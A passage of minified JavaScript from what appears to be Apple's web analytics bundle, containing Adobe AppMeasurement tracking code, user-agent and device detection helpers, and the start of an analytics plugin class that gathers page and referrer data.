c=0;c<b.dests.length;++c){var d=b.dests[c];"object"==typeof d&&"string"==typeof d.c&&"string"==typeof d.id&&"aa."==d.id.substr(0,3)&&(a.qa[d.id]=new Image,a.qa[d.id].alt="",a.qa[d.id].src=d.c)}},a.jb=function(b){a.i||a.Xb(),a.i.push(b),a.ja=a.A(),a.Za()},a.Xb=function(){a.i=a.$b(),a.i||(a.i=[])},a.$b=function(){var b,c;if(a.pa()){try{(c=h.localStorage.getItem(a.na()))&&(b=h.JSON.parse(c))}catch(d){}return b}},a.pa=function(){var b=!0;return a.trackOffline&&a.offlineFilename&&h.localStorage&&h.JSON||(b=!1),b},a.Pa=function(){var b=0;return a.i&&(b=a.i.length),a.o&&b++,b},a.U=function(){if(!a.o||(a.v&&a.v.complete&&a.v.C&&a.v.R(),!a.o))if(a.Qa=q,a.oa)a.ja>a.N&&a.Xa(a.i),a.ra(500);else{var b=a.Jb();0<b?a.ra(b):(b=a.Na())&&(a.o=1,a.ac(b),a.ec(b))}},a.ra=function(b){a.Qa||(b||(b=0),a.Qa=setTimeout(a.U,b))},a.Jb=function(){var b;return!a.trackOffline||0>=a.offlineThrottleDelay?0:(b=a.A()-a.Va,a.offlineThrottleDelay<b?0:a.offlineThrottleDelay-b)},a.Na=function(){if(0<a.i.length)return a.i.shift()},a.ac=function(b){if(a.debugTracking){var d,c="AppMeasurement Debug: "+b;for(b=b.split("&"),d=0;d<b.length;d++)c+="\n\t"+a.unescape(b[d]);a.log(c)}},a.ya=function(){return a.marketingCloudVisitorID||a.analyticsVisitorID},a.X=!1;try{t=JSON.parse('{"x":"y"}')}catch(v){t=null}for(t&&"y"==t.x?(a.X=!0,a.W=function(a){return JSON.parse(a)}):h.$&&h.$.parseJSON?(a.W=function(a){return h.$.parseJSON(a)},a.X=!0):a.W=function(){return null},a.ec=function(b){var c,d,f;if(a.rb(b)&&(d=1,c={send:function(b){a.useBeacon=!1,navigator.sendBeacon(b)?c.R():c.ha()}}),!c&&a.ya()&&2047<b.length&&(a.eb()&&(d=2,c=new XMLHttpRequest),c&&(a.AudienceManagement&&a.AudienceManagement.isReady()||0!=a.usePostbacks)&&(a.X?c.Ia=!0:c=0)),!c&&a.jc&&(b=b.substring(0,2047)),!c&&a.d.createElement&&(0!=a.usePostbacks||a.AudienceManagement&&a.AudienceManagement.isReady())&&(c=a.d.createElement("SCRIPT"))&&"async"in c&&((f=(f=a.d.getElementsByTagName("HEAD"))&&f[0]?f[0]:a.d.body)?(c.type="text/javascript",c.setAttribute("async","async"),d=3):c=0),c||(d=4,(c=new Image).alt="",c.abort||void 0===h.InstallTrigger||(c.abort=function(){c.src=q})),c.Wa=Date.now(),c.Ka=function(){try{c.C&&(clearTimeout(c.C),c.C=0)}catch(a){}},c.onload=c.R=function(){if(c.Wa&&(a.ka=Date.now()-c.Wa),a.kb(b),c.Ka(),a.Nb(),a.da(),a.o=0,a.U(),c.Ia){c.Ia=!1;try{a.doPostbacks(a.W(c.responseText))}catch(d){}}},c.onabort=c.onerror=c.ha=function(){c.Ka(),(a.trackOffline||a.oa)&&a.o&&a.i.unshift(a.Mb),a.o=0,a.ja>a.N&&a.Xa(a.i),a.da(),a.ra(500)},c.onreadystatechange=function(){4==c.readyState&&(200==c.status?c.R():c.ha())},a.Va=a.A(),1===d)c.send(b);else if(2===d)f=b.indexOf("?"),d=b.substring(0,f),f=(f=b.substring(f+1)).replace(/&callback=[a-zA-Z0-9_.\[\]]+/,""),c.open("POST",d,!0),c.withCredentials=!0,c.send(f);else if(c.src=b,3===d){if(a.Ta)try{f.removeChild(a.Ta)}catch(e){}f.firstChild?f.insertBefore(c,f.firstChild):f.appendChild(c),a.Ta=a.v}c.C=setTimeout((function(){c.C&&(c.complete?c.R():(a.trackOffline&&c.abort&&c.abort(),c.ha()))}),5e3),a.Mb=b,a.v=h["s_i_"+a.replace(a.account,",","_")]=c,(a.useForcedLinkTracking&&a.J||a.bodyClickFunction)&&(a.forcedLinkTrackingTimeout||(a.forcedLinkTrackingTimeout=250),a.ea=setTimeout(a.da,a.forcedLinkTrackingTimeout))},a.rb=function(b){var c=!1;return navigator.sendBeacon&&(a.tb(b)||a.useBeacon)&&(c=!0),a.Cb(b)&&(c=!1),c},a.tb=function(a){return!!(a&&0<a.indexOf("pe=lnk_e"))},a.Cb=function(a){return 64e3<=a.length},a.eb=function(){return"undefined"!=typeof XMLHttpRequest&&"withCredentials"in new XMLHttpRequest},a.Nb=function(){if(a.pa()&&!(a.Ua>a.N))try{h.localStorage.removeItem(a.na()),a.Ua=a.A()}catch(b){}},a.Xa=function(b){if(a.pa()){a.Za();try{h.localStorage.setItem(a.na(),h.JSON.stringify(b)),a.N=a.A()}catch(c){}}},a.Za=function(){if(a.trackOffline)for((!a.offlineLimit||0>=a.offlineLimit)&&(a.offlineLimit=10);a.i.length>a.offlineLimit;)a.Na()},a.forceOffline=function(){a.oa=!0},a.forceOnline=function(){a.oa=!1},a.na=function(){return a.offlineFilename+"-"+a.visitorNamespace+a.account},a.A=function(){return(new Date).getTime()},a.Ra=function(a){return 0!=(a=a.toLowerCase()).indexOf("#")&&0!=a.indexOf("about:")&&0!=a.indexOf("opera:")&&0!=a.indexOf("javascript:")},a.setTagContainer=function(b){var c,d,f;for(a.fc=b,c=0;c<a._il.length;c++)if((d=a._il[c])&&"s_l"==d._c&&d.tagContainerName==b){if(a.S(d),d.lmq)for(c=0;c<d.lmq.length;c++)f=d.lmq[c],a.loadModule(f.n);if(d.ml)for(f in d.ml)if(a[f])for(c in b=a[f],f=d.ml[f])!Object.prototype[c]&&("function"!=typeof f[c]||0>(""+f[c]).indexOf("s_c_il"))&&(b[c]=f[c]);if(d.mmq)for(c=0;c<d.mmq.length;c++)f=d.mmq[c],a[f.m]&&((b=a[f.m])[f.f]&&"function"==typeof b[f.f]&&(f.a?b[f.f].apply(b,f.a):b[f.f].apply(b)));if(d.tq)for(c=0;c<d.tq.length;c++)a.track(d.tq[c]);d.s=a;break}},a.Util={urlEncode:a.escape,urlDecode:a.unescape,cookieRead:a.cookieRead,cookieWrite:a.cookieWrite,getQueryParam:function(b,c,d,f){var e,g="";return c||(c=a.pageURL?a.pageURL:h.location),d=d||"&",b&&c?0>(e=(c=""+c).indexOf("?"))?g:(c=d+c.substring(e+1)+d,f&&(0<=c.indexOf(d+b+d)||0<=c.indexOf(d+b+"="+d))?void 0:(0<=(e=c.indexOf("#"))&&(c=c.substr(0,e)+d),0>(e=c.indexOf(d+b+"="))||(0<=(e=(c=c.substring(e+d.length+b.length+1)).indexOf(d))&&(c=c.substring(0,e)),0<c.length&&(g=a.unescape(c))),g)):g},getIeVersion:function(){return document.documentMode?document.documentMode:a.za()?7:null}},a.D="supplementalDataID timestamp dynamicVariablePrefix visitorID marketingCloudVisitorID analyticsVisitorID audienceManagerLocationHint authState fid vmk visitorMigrationKey visitorMigrationServer visitorMigrationServerSecure charSet visitorNamespace cookieDomainPeriods fpCookieDomainPeriods cookieLifetime pageName pageURL customerPerspective referrer contextData contextData.cm.ssf contextData.opt.dmp contextData.opt.sell clientHints currencyCode lightProfileID lightStoreForSeconds lightIncrementBy retrieveLightProfiles deleteLightProfiles retrieveLightData".split(" "),a.g=a.D.concat("purchaseID variableProvider channel server pageType transactionID campaign state zip events events2 products audienceManagerBlob tnt".split(" ")),a.la="timestamp charSet visitorNamespace cookieDomainPeriods cookieLifetime contextData lightProfileID lightStoreForSeconds lightIncrementBy".split(" "),a.O=a.la.slice(0),a.Ha="account allAccounts debugTracking visitor visitorOptedOut trackOffline offlineLimit offlineThrottleDelay offlineFilename usePlugins doPlugins configURL visitorSampling visitorSamplingGroup linkObject clickObject linkURL linkName linkType trackDownloadLinks trackExternalLinks trackClickMap trackInlineStats linkLeaveQueryString linkTrackVars linkTrackEvents linkDownloadFileTypes linkExternalFilters linkInternalFilters useForcedLinkTracking forcedLinkTrackingTimeout writeSecureCookies useLinkTrackSessionStorage collectHighEntropyUserAgentHints trackingServer trackingServerSecure ssl abort mobile dc lightTrackVars maxDelay expectSupplementalData useBeacon usePostbacks registerPreTrackCallback registerPostTrackCallback bodyClickTarget bodyClickFunction AudienceManagement".split(" "),m=0;250>=m;m++)76>m&&(a.g.push("prop"+m),a.O.push("prop"+m)),a.g.push("eVar"+m),a.O.push("eVar"+m),6>m&&a.g.push("hier"+m),4>m&&a.g.push("list"+m);m="pe pev1 pev2 pev3 latitude longitude resolution colorDepth javascriptVersion javaEnabled cookiesEnabled browserWidth browserHeight connectionType homepage pageURLRest marketingCloudOrgID ms_a".split(" "),a.g=a.g.concat(m),a.D=a.D.concat(m),a.ssl=0<=h.location.protocol.toLowerCase().indexOf("https"),a.charSet="UTF-8",a.contextData={},a.ta=["architecture","bitness","model","platformVersion","wow64"],a.writeSecureCookies=!1,a.collectHighEntropyUserAgentHints=!1,a.offlineThrottleDelay=0,a.offlineFilename="AppMeasurement.offline",a.P="s_sq",a.Va=0,a.ja=0,a.N=0,a.Ua=0,a.linkDownloadFileTypes="exe,zip,wav,mp3,mov,mpg,avi,wmv,pdf,doc,docx,xls,xlsx,ppt,pptx",a.w=h,a.d=h.document,a.da=function(){a.ea&&(h.clearTimeout(a.ea),a.ea=q),a.bodyClickTarget&&a.J&&a.bodyClickTarget.dispatchEvent(a.J),a.bodyClickFunction&&("function"==typeof a.bodyClickFunction?a.bodyClickFunction():a.bodyClickTarget&&a.bodyClickTarget.href&&(a.d.location=a.bodyClickTarget.href)),a.bodyClickTarget=a.J=a.bodyClickFunction=0},a.Ya=function(){a.b=a.d.body,a.b?(a.r=function(b){var c,d,f,e,g;if(!(a.d&&a.d.getElementById("cppXYctnr")||b&&b["s_fe_"+a._in])){if(a.Ja){if(!a.useForcedLinkTracking)return a.b.removeEventListener("click",a.r,!0),void(a.Ja=a.useForcedLinkTracking=0);a.b.removeEventListener("click",a.r,!1)}else a.useForcedLinkTracking=0;a.clickObject=b.srcElement?b.srcElement:b.target;try{if(!a.clickObject||a.M&&a.M==a.clickObject||!(a.clickObject.tagName||a.clickObject.parentElement||a.clickObject.parentNode))a.clickObject=0;else{var k=a.M=a.clickObject;if(a.ia&&(clearTimeout(a.ia),a.ia=0),a.ia=setTimeout((function(){a.M==k&&(a.M=0)}),1e4),f=a.Pa(),a.track(),f<a.Pa()&&a.useForcedLinkTracking&&b.target){for(e=b.target;e&&e!=a.b&&"A"!=e.tagName.toUpperCase()&&"AREA"!=e.tagName.toUpperCase();)e=e.parentNode;if(e&&(g=e.href,a.Ra(g)||(g=0),d=e.target,b.target.dispatchEvent&&g&&(!d||"_self"==d||"_top"==d||"_parent"==d||h.name&&d==h.name))){try{c=a.d.createEvent("MouseEvents")}catch(l){c=new h.MouseEvent}if(c){try{c.initMouseEvent("click",b.bubbles,b.cancelable,b.view,b.detail,b.screenX,b.screenY,b.clientX,b.clientY,b.ctrlKey,b.altKey,b.shiftKey,b.metaKey,b.button,b.relatedTarget)}catch(m){c=0}c&&(c["s_fe_"+a._in]=c.s_fe=1,b.stopPropagation(),b.stopImmediatePropagation&&b.stopImmediatePropagation(),b.preventDefault(),a.bodyClickTarget=b.target,a.J=c)}}}}}catch(n){a.clickObject=0}}},a.b&&a.b.attachEvent?a.b.attachEvent("onclick",a.r):a.b&&a.b.addEventListener&&(navigator&&(0<=navigator.userAgent.indexOf("WebKit")&&a.d.createEvent||0<=navigator.userAgent.indexOf("Firefox/2")&&h.MouseEvent)&&(a.Ja=1,a.useForcedLinkTracking=1,a.b.addEventListener("click",a.r,!0)),a.b.addEventListener("click",a.r,!1))):setTimeout(a.Ya,30)},a.jc=a.za(),a.Ob(),a.qc||(r?a.setAccount(r):a.log("Error, missing Report Suite ID in AppMeasurement initialization"),a.Ya(),a.loadModule("ActivityMap"))},AppMeasurement.getInstance=s_gi,window.s_objectID||(window.s_objectID=0),s_pgicq(),s_pgicq(),module.exports={s_gi:s_gi,s_pgicq:s_pgicq}}()},{}],290:[function(require,module,exports){"use strict";var s_gi=require("./AppMeasurement").s_gi;require("./AppMeasurement");module.exports=function initialize(s_account){if("string"==typeof s_account)return s_gi(s_account)}},{"./AppMeasurement":289}],291:[function(require,module,exports){"use strict";module.exports.init=function init(corePlugins,am){corePlugins.forEach((function(corePlugin){corePlugin.init?corePlugin.init(am):corePlugin(am)}))}},{}],292:[function(require,module,exports){"use strict";var app,initSGI=require("./AppMeasurement/initialize"),initPlugins=require("./AppMeasurement/plugins");module.exports={init:function init(config){if(config&&(!app||!0===config.options.force))return function setDefaults(config,am){Object.keys(config).forEach((function(key){"options"!==key&&(am[key]=config[key])})),!0===am.isSafariTopSitesPreview&&(am.t=function(){return""})}(config,app=window.s=initSGI(function _modifyBucket(bucket){var dls=document.location.search;bucket&&"string"==typeof bucket||(bucket="");dls&&bucket&&-1===bucket.indexOf("applestoreww")&&(dls.indexOf("?cid=AOS-")>-1||dls.indexOf("&cid=AOS-")>-1)&&(bucket+=",applestoreww");return bucket}(config.bucket))),initPlugins.init(config.options.corePlugins,app),app},getInstance:function getInstance(){return app}}},{"./AppMeasurement/initialize":290,"./AppMeasurement/plugins":291}],293:[function(require,module,exports){"use strict";var isNodeType=require("@marcom/ac-dom-nodes/isNodeType"),validate=require("./internal/validate"),ELEMENT=require("@marcom/ac-dom-nodes/NODE_TYPES").ELEMENT;module.exports=function ancestor(node,selector,inclusive,context){if(validate.childNode(node,"ancestors"),validate.selector(selector,"ancestors"),inclusive&&isNodeType(node,ELEMENT)&&(!selector||node.matches(selector)))return node;if(node!==(context=context||document.body))for(;(node=node.parentNode)&&isNodeType(node,ELEMENT);){if(!selector||node.matches(selector))return node;if(node===context)break}return null}},{"./internal/validate":294,"@marcom/ac-dom-nodes/NODE_TYPES":259,"@marcom/ac-dom-nodes/isNodeType":269}],294:[function(require,module,exports){"use strict";var isNodeType=require("@marcom/ac-dom-nodes/isNodeType"),NODE_TYPES=require("@marcom/ac-dom-nodes/NODE_TYPES"),COMMENT_NODE=NODE_TYPES.COMMENT,DOCUMENT_FRAGMENT_NODE=NODE_TYPES.DOCUMENT_FRAGMENT,DOCUMENT_NODE=NODE_TYPES.DOCUMENT,ELEMENT_NODE=NODE_TYPES.ELEMENT,TEXT_NODE=NODE_TYPES.TEXT,VALID_PARENT_NODE=[ELEMENT_NODE,DOCUMENT_NODE,DOCUMENT_FRAGMENT_NODE],VALID_CHILD_NODE=[ELEMENT_NODE,TEXT_NODE,COMMENT_NODE];module.exports={parentNode:function(node,funcName){if(!node||!isNodeType(node,VALID_PARENT_NODE))throw new TypeError(funcName+": node must be an Element, Document, or Document Fragment")},childNode:function(node,funcName){if(!node||!isNodeType(node,VALID_CHILD_NODE))throw new TypeError(funcName+": node must be an Element, TextNode, or Comment")},selector:function(selector,funcName,required){if(required="boolean"==typeof required&&required,(selector||required)&&"string"!=typeof selector)throw new TypeError(funcName+": selector must be a string")}}},{"@marcom/ac-dom-nodes/NODE_TYPES":259,"@marcom/ac-dom-nodes/isNodeType":269}],295:[function(require,module,exports){"use strict";module.exports=function isAncestorOf(ancestor,descendent){return ancestor!==descendent&&("contains"in ancestor?ancestor.contains(descendent):!!(ancestor.compareDocumentPosition(descendent)&Node.DOCUMENT_POSITION_CONTAINED_BY))}},{}],296:[function(require,module,exports){const{defaultOptions:defaultOptions,ElementEngagementObserver:ElementEngagementObserver}=require("./element-engagement-observer/ElementEngagementObserver");module.exports={defaultOptions:defaultOptions,ElementEngagementObserver:ElementEngagementObserver}},{"./element-engagement-observer/ElementEngagementObserver":297}],297:[function(require,module,exports){const defaultOptions={titleDataAttribute:"analytics-element-engagement",dataAttribute:"analyticsElementEngagement",startDataAttribute:"analyticsElementEngagementStart",endDataAttribute:"analyticsElementEngagementEnd",target:document.body,startHandler:null,endHandler:null,evaluateHandler:null,track:null,engagementTimeThreshold:1e3,once:!0,autoEnable:!1};module.exports={defaultOptions:defaultOptions,ElementEngagementObserver:class ElementEngagementObserver{constructor(options={}){this.options={...defaultOptions,...options},this.observerType="elementEngagement",this.engagements={},this.options.autoEnable&&this.enable()}enable(){this.attachEventListeners()}disable(){this.detachEventListeners();for(const title in this.engagements)clearTimeout(this.engagements[title].timeout)}attachEventListeners(){const{target:target}=this.options;let{[this.options.startDataAttribute]:startEvt,[this.options.endDataAttribute]:endEvt}=target.dataset;target.addEventListener(startEvt,this.startHandler.bind(this)),target.addEventListener(endEvt,this.endHandler.bind(this))}detachEventListeners(){const{target:target}=this.options;let{[this.options.startDataAttribute]:startEvt,[this.options.endDataAttribute]:endEvt}=target.dataset;target.removeEventListener(startEvt,this.startHandler),target.removeEventListener(endEvt,this.endHandler)}startHandler(evt){const{detail:detail}=evt,{target:target}=detail||evt,{dataset:{analyticsElementEngagement:engagementTitle}}=target;engagementTitle&&(this.engagements[engagementTitle]=this.engagements[engagementTitle]||{},this.engagements[engagementTitle].timeout&&clearTimeout(this.engagements[engagementTitle].timeout),this.options.once&&this.engagements[engagementTitle].hasFired||(this.engagements[engagementTitle].timeout=setTimeout((()=>{this.track({engagementTitle:engagementTitle,target:target}),this.options.once&&(this.engagements[engagementTitle].hasFired=!0)}),this.options.engagementTimeThreshold)))}endHandler(evt){const{detail:detail}=evt,{target:target}=detail||evt,{dataset:{analyticsElementEngagement:engagementTitle}}=target;engagementTitle&&(this.engagements[engagementTitle]=this.engagements[engagementTitle]||{},this.engagements[engagementTitle].timeout&&clearTimeout(this.engagements[engagementTitle].timeout))}track(data){this.options.track&&"function"==typeof this.options.track&&this.options.track(data)}}}},{}],298:[function(require,module,exports){"use strict";module.exports={getWindow:function(){return window},getDocument:function(){return document},getNavigator:function(){return navigator}}},{}],299:[function(require,module,exports){"use strict";var os=require("@marcom/useragent-detect").os,touchAvailable=require("./touchAvailable").original,globalsHelper=require("./helpers/globals"),once=require("@marcom/function-utils/once");function isDesktop(){var windowObj=globalsHelper.getWindow();return!touchAvailable()&&!windowObj.orientation||os.windows}module.exports=once(isDesktop),module.exports.original=isDesktop},{"./helpers/globals":298,"./touchAvailable":302,"@marcom/function-utils/once":304,"@marcom/useragent-detect":308}],300:[function(require,module,exports){"use strict";var isDesktop=require("./isDesktop").original,isTablet=require("./isTablet").original,once=require("@marcom/function-utils/once");function isHandheld(){return!isDesktop()&&!isTablet()}module.exports=once(isHandheld),module.exports.original=isHandheld},{"./isDesktop":299,"./isTablet":301,"@marcom/function-utils/once":304}],301:[function(require,module,exports){"use strict";var isDesktop=require("./isDesktop").original,globalsHelper=require("./helpers/globals"),once=require("@marcom/function-utils/once");function isTablet(){var windowObj=globalsHelper.getWindow(),width=windowObj.screen.width;return windowObj.orientation&&windowObj.screen.height<width&&(width=windowObj.screen.height),!isDesktop()&&width>=600}module.exports=once(isTablet),module.exports.original=isTablet},{"./helpers/globals":298,"./isDesktop":299,"@marcom/function-utils/once":304}],302:[function(require,module,exports){"use strict";var globalsHelper=require("./helpers/globals"),once=require("@marcom/function-utils/once");function touchAvailable(){var windowObj=globalsHelper.getWindow(),documentObj=globalsHelper.getDocument(),navigatorObj=globalsHelper.getNavigator();return!!("ontouchstart"in windowObj||windowObj.DocumentTouch&&documentObj instanceof windowObj.DocumentTouch||navigatorObj.maxTouchPoints>0||navigatorObj.msMaxTouchPoints>0)}module.exports=once(touchAvailable),module.exports.original=touchAvailable},{"./helpers/globals":298,"@marcom/function-utils/once":304}],303:[function(require,module,exports){"use strict";var PARAM_ERROR_TEXT="Error: Expected parameter is missing or has the wrong type",DEFAULT_OPTIONS={trailing:!0,leading:!1};module.exports=function debounce(func,wait,options){if("number"!=typeof wait||"function"!=typeof func)throw new TypeError(PARAM_ERROR_TEXT);if("boolean"!=typeof(options=Object.assign({},DEFAULT_OPTIONS,options)).trailing||"boolean"!=typeof options.leading)throw new TypeError(PARAM_ERROR_TEXT);options.trailing||options.leading||(options.trailing=!0);var timeout=null,callsNumber=0;function debounced(){options.leading&&options.trailing&&callsNumber++;var args=arguments;null===timeout&&options.leading&&func.apply(this,args);var later=function(){timeout=null,options.leading?callsNumber>1&&options.trailing&&(func.apply(this,args),callsNumber=0):func.apply(this,args)}.bind(this);clearTimeout(timeout),timeout=setTimeout(later,wait)}return debounced.cancel=function cancel(){clearTimeout(timeout)},debounced}},{}],304:[function(require,module,exports){"use strict";module.exports=function once(func){var result;return function(){return void 0===result&&(result=func.apply(this,arguments)),result}}},{}],305:[function(require,module,exports){"use strict";module.exports=function defaults(dictionary){const res={};for(const key in dictionary)res[key]=dictionary[key].reduce((function(def,spec){return def[spec.name]=!1,def}),{version:{string:"",major:0,minor:0,patch:0,documentMode:!1}});return res}},{}],306:[function(require,module,exports){"use strict";module.exports={browser:[{name:"edge",userAgent:"Edge",version:["rv","Edge"],test:function(navigatorObj){return navigatorObj.ua.indexOf("Edge")>-1||"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"===navigatorObj.ua}},{name:"edgeChromium",userAgent:"Edge",version:["rv","Edg"],test:function(navigatorObj){return navigatorObj.ua.indexOf("Edg")>-1&&-1===navigatorObj.ua.indexOf("Edge")}},{name:"chrome",userAgent:"Chrome"},{name:"firefox",test:function(navigatorObj){return navigatorObj.ua.indexOf("Firefox")>-1&&-1===navigatorObj.ua.indexOf("Opera")},version:"Firefox"},{name:"android",userAgent:"Android"},{name:"safari",test:function(navigatorObj){return navigatorObj.ua.indexOf("Safari")>-1&&navigatorObj.vendor.indexOf("Apple")>-1},version:"Version"},{name:"ie",test:function(navigatorObj){return navigatorObj.ua.indexOf("IE")>-1||navigatorObj.ua.indexOf("Trident")>-1},version:["MSIE","rv"],parseDocumentMode:function(){let documentModeForIE=!1;return document.documentMode&&(documentModeForIE=parseInt(document.documentMode,10)),documentModeForIE}},{name:"opera",userAgent:"Opera",version:["Version","Opera"]},{name:"samsung",userAgent:"SamsungBrowser"}],os:[{name:"windows",test:function(navigatorObj){return navigatorObj.ua.indexOf("Windows")>-1},version:"Windows NT"},{name:"osx",userAgent:"Mac",test:function(navigatorObj){return navigatorObj.ua.indexOf("Macintosh")>-1}},{name:"ios",test:function(navigatorObj){return navigatorObj.ua.indexOf("iPhone")>-1||navigatorObj.ua.indexOf("iPad")>-1},version:["iPhone OS","CPU OS"]},{name:"linux",userAgent:"Linux",test:function(navigatorObj){return(navigatorObj.ua.indexOf("Linux")>-1||navigatorObj.platform.indexOf("Linux")>-1)&&-1===navigatorObj.ua.indexOf("Android")}},{name:"fireos",test:function(navigatorObj){return navigatorObj.ua.indexOf("Firefox")>-1&&navigatorObj.ua.indexOf("Mobile")>-1},version:"rv"},{name:"android",userAgent:"Android",test:function(navigatorObj){return navigatorObj.ua.indexOf("Android")>-1}},{name:"chromeos",userAgent:"CrOS"}]}},{}],307:[function(require,module,exports){"use strict";const defaults=require("./defaults"),dictionary=require("./dictionary");function _parseVersion(data,ua){if("function"==typeof data.parseVersion)return data.parseVersion(ua);{let versionSearchStr=data.version||data.userAgent;"string"==typeof versionSearchStr&&(versionSearchStr=[versionSearchStr]);const versionSearchStrLength=versionSearchStr.length;let match;for(let i=0;i<versionSearchStrLength;i++)if(match=ua.match((str=versionSearchStr[i],new RegExp(str+"[a-zA-Z\\s/:]+([0-9_.]+)","i"))),match&&match.length>1)return match[1].replace(/_/g,".")}var str;return!1}function _parseUserAgent(dictionaryData,defaultObj,navigatorObj){const dictionaryDataLength=dictionaryData.length;let current,currentVersion;for(let i=0;i<dictionaryDataLength;i++)if("function"==typeof dictionaryData[i].test?!0===dictionaryData[i].test(navigatorObj)&&(current=dictionaryData[i].name):navigatorObj.ua.indexOf(dictionaryData[i].userAgent)>-1&&(current=dictionaryData[i].name),current){if(defaultObj[current]=!0,currentVersion=_parseVersion(dictionaryData[i],navigatorObj.ua),"string"==typeof currentVersion){const versionBreakdown=currentVersion.split(".");defaultObj.version.string=currentVersion,versionBreakdown&&versionBreakdown.length>0&&(defaultObj.version.major=parseInt(versionBreakdown[0]||0),defaultObj.version.minor=parseInt(versionBreakdown[1]||0),defaultObj.version.patch=parseInt(versionBreakdown[2]||0))}else"edge"===current&&(defaultObj.version.string="12.0.0",defaultObj.version.major="12",defaultObj.version.minor="0",defaultObj.version.patch="0");return"function"==typeof dictionaryData[i].parseDocumentMode&&(defaultObj.version.documentMode=dictionaryData[i].parseDocumentMode()),defaultObj}return defaultObj}module.exports=function parseUserAgent(navigatorObj){const userAgent={},fallback=defaults(dictionary);return userAgent.browser=_parseUserAgent(dictionary.browser,fallback.browser,navigatorObj),userAgent.os=_parseUserAgent(dictionary.os,fallback.os,navigatorObj),userAgent}},{"./defaults":305,"./dictionary":306}],308:[function(require,module,exports){"use strict";const navigator="undefined"!=typeof window?window.navigator:{userAgent:"",platform:"",vendor:""},navigatorObj={ua:navigator.userAgent,platform:navigator.platform,vendor:navigator.vendor};module.exports=require("./parseUserAgent")(navigatorObj)},{"./parseUserAgent":307}],309:[function(require,module,exports){const errorHandler=require("../ErrorHandler"),appMeasurementSetup=require("@marcom/appmeasurement-setup"),biscuitTin=require("@apple/analytics-biscuit-tin"),get=require("@apple/analytics-data-layer").get,set=require("@apple/analytics-data-layer").set,refreshDataLayer=require("../helpers/dataLayer").refresh,eventsToString=require("../helpers/eventsToString"),formatter=require("../helpers/formatter"),passiveTrackerInit=require("@apple/analytics-passive-tracker").init,triggerNewPage=require("@apple/analytics-passive-tracker").triggerNewPage,generateSpecialExitLinks=require("../helpers/generateSpecialExitLinks"),submitMethods=require("./submit-methods/submitMethods"),templateVarHelper=require("../helpers/templateVar"),constants=require("../constants"),metaKey=constants.dataLayer.meta.key,confKey=constants.dataLayer.configuration.key,optionsKey=constants.dataLayer.configuration.optionsKey,dlKeys=constants.dataLayer.configuration.keys,doPlugins=require("./doPlugins/doPlugins"),corePlugins=require("./appMeasurementPlugins"),urlHelpers=require("@apple/analytics-utils").urlHelpers,observerRegistry=require("../observers/observerRegistry"),cookie=require("../helpers/cookie"),defaultOptions={force:!0,destroyObservers:!1},moduleName="AppMeasurementPlugin";module.exports=class AppMeasurementPlugin{constructor(options){this.options={...defaultOptions,...options},this.conf={},this._bindMethods()}destroy(options){this.options={...defaultOptions,...options},this.destroyAppMeasurement(),this.resetReferrer(),this.resetLoadTiming(),this.options.destroyObservers&&this.destroyObservers(this.options)}initialize(options){if(this.refreshData(options),passiveTrackerInit({muleVersion:"v1",cookieDomain:get(confKey)[dlKeys.trackingDomain]}),errorHandler.exception)return;let data=this.getAppMeasurementConfig();errorHandler.exception||(data=this.preAppMeasurementInit(data),errorHandler.exception||appMeasurementSetup.init(data))}refreshData(options){refreshDataLayer(options),this._prepareDataLayer(),biscuitTin.retrieve()}_prepareDataLayer(){const items=get(metaKey);if(this._hasRequiredData(items)||errorHandler.log(moduleName,"_prepareDataLayer","Missing required source data"),errorHandler.exception)return;if(Object.keys(items).forEach((key=>{this.conf[this._transformPropertyName(key)]=items[key]})),this._setConfigurationProperty(dlKeys.pageName,this._getPageName(this.conf[dlKeys.track])),this._setConfigurationProperty(dlKeys.productName,this._getProductName(this.conf[dlKeys.track])),this._setConfigurationProperty(dlKeys.locale,this._getLocale(this.conf[dlKeys.track])),this.conf[dlKeys.locale]||errorHandler.log(moduleName,"_prepareDataLayer","ISO code must be provided"),errorHandler.exception)return;this._setConfigurationProperty(dlKeys.pageType,this._getPageType(this.conf[dlKeys.pageName]));const pageUrl=urlHelpers.sanitizeUrl({url:document.location.href,pageType:this.conf[dlKeys.pageType]});this._setConfigurationProperty(dlKeys.pageURL,pageUrl);const pageUrlObj=new URL(pageUrl);this._setConfigurationProperty(dlKeys.queryString,pageUrlObj.search),this._setConfigurationProperty(dlKeys.pageURLNoQueryString,pageUrl.replace(pageUrlObj.search,""));let referrer=get([confKey,dlKeys.referrer]);if(referrer||(referrer=urlHelpers.sanitizeUrl({url:document.referrer,pageType:this.conf[dlKeys.pageType],isReferrerUrl:!0})),this._setConfigurationProperty(dlKeys.referrer,referrer||""),this._setConfigurationProperty(dlKeys.searchTerm,this._getSearchTerm()),this._setConfigurationProperty(dlKeys.initialTimeStamp,Date.now()),this._setConfigurationProperty(dlKeys.platform,this._getPlatform()),this._setConfigurationProperty(dlKeys.countryBuckets,constants.countryBuckets),this._setConfigurationProperty(dlKeys.subdomains,constants.subdomains),this._setConfigurationProperty(dlKeys.subdomainSupportedDomains,constants.supportedSubdomains),this._setConfigurationProperty(dlKeys.currencyCode,"USD"),this._setConfigurationProperty(dlKeys.acAnalyticsVersion,constants.acAnalyticsVersion),this._setConfigurationProperty(dlKeys.trackingDomain,this.getTrackingDomain()),this._setConfigurationProperty(dlKeys.cookieDomainPeriods,this.setCookieDomainPeriods()),this._setConfigurationProperty(dlKeys.cookieLifetime,constants.cookieLifetime),this._setConfigurationProperty(dlKeys.clickTimerCount,0),this._setConfigurationProperty(dlKeys.clickTimerLinkInteraction,!1),this._setConfigurationProperty(dlKeys.trackingServer,this.getTrackingServer()),this._setConfigurationProperty(dlKeys.trackingServerSecure,this.getSecureTrackingServer()),this._setConfigurationProperty(dlKeys.linkDownloadFileTypes,constants.linkDownloadFileTypes.join(",")),errorHandler.exception)return;this.formattedValues={};const 